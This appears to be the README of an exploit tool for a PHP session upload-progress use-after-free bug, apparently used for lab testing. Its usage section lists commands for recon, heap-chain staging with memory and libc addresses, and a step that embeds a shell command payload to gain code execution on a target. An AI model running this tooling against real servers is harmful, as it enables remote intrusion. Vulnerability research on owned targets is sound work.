# php2slop

Offline record builder and lab driver for the PHP 8.5
`session.upload_progress` use-after-free family
(CVE-2026-109618 / CVE-2026-109619).

## Requirements

- python3 ≥ 3.10, standard library only.
- A target you own, passed by the operator with `--target wiki|wp|modphp` (mapped to 127.0.0.1) or `--target http://127.0.0.1:8080`.
- Optional: `gdb`, `nm` and `readelf` to derive offsets for new builds.

## Build

No build step; run in place with `./tool/php2shell.py` or `python3 -m tool`.

## Usage

```sh
./tool/php2shell.py --target wiki --step recon
./tool/php2shell.py --target modphp --step chain \
  --unser-url http://127.0.0.1:8080/unser.php --arm-url http://127.0.0.1:8080/
./tool/php2shell.py --target modphp --step producer --producer unser --unser-url http://127.0.0.1:8080/unser.php --memory-limit 2M
./tool/php2shell.py --target wiki --step write_stage --main-chunk 0x7f8875a00000
./tool/php2shell.py --step g2 --g2-x 0x7ffff7a6a000 --g2-p 0x7ffff7a81000 \
  --g2-b0 0x7ffff7a84000 --g2-total 131014 --command 'id;exit;#' \
  --libc-base 0x7ffff7c9c000
```

`recon`, `producer` and `chain` send to the operator-supplied target.
`write_stage`, `leak` and `g2` only build records and write `result.json` plus
artifacts under `files/io/<target>-<step>-<timestamp>/`. Profiles are md5 locked
and selected with `--g2-profile 8.5.10|8.4.25|8.1.34|7.4.33|<md5>`.

## Scope and limits

Authorized testing on operator-owned targets only: the operator supplies the
target URL. `--step g2` has no transport.

## License

AGPL-3.0; see `LICENSE`. Details: `USAGE.md` and `docs/`.
